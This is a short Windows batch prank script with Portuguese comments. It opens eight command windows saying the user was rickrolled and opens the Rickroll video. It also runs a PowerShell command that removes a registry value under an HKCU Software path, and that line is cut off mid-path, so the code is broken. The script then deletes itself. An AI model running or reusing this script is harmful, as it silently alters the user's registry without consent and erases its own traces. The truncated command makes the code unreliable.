@echo off
title Você foi rickrollado :)

REM Quantas janelas de CMD você quer abrir?
set QTD=8

REM Abre várias janelas de CMD
for /l %%i in (1,1,%QTD%) do (
    start "" cmd /k "echo Você foi rickrollado %%i! & echo. & pause"
)

REM Abre o vídeo do Rickroll no navegador padrão
start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ

powershell -Command "Remove-ItemProperty -Path 'HKCU:\Software\Micros>

del "%~f0"
